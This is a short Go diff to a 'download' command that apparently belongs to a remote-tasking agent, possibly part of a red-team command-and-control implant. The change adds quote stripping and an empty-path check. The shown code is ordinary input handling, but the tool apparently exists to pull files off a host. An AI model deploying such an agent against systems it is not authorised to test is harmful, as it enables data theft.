@@ -24,7 +24,16 @@ func (c *DownloadCommand) Description() string {
 
 // Execute executes the download command with full chunked file transfer
 func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
-	path := task.Params
+	// Strip surrounding quotes in case the user wrapped the path (e.g. "C:\Program Data\file.txt")
+	path := stripPathQuotes(task.Params)
+
+	if path == "" {
+		return structs.CommandResult{
+			Output:    "Error: No file path specified. Usage: download <file_path>",
+			Status:    "error",
+			Completed: true,
+		}
+	}
 
 	// Get absolute path
 	fullPath, err := filepath.Abs(path)
